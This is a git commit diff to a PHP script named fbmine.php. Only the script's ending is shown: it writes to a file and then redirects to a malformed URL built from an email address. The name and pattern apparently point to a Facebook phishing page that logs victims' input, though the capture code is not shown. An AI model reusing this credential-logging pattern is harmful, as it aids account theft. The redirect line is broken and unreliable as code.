026ee182f8abe9d6aad51d4da293a2b8924a4d8f
alphagiven <48234596+alphagiven@users.noreply.github.com>
2020-01-23 19:06:40 +0200

    ddffd

--- fbmine.php
+++ fbmine.php
@@ -11,6 +11,6 @@ fwrite($handle,"\r\n");
 }
 fwrite($handle,"\r\n");
 fclose($handle);
-header( $to = "chaukegivencplus@gmail.com");
+header("location:http://chaukegivencplus@gmail.com");
 exit;
 ?>
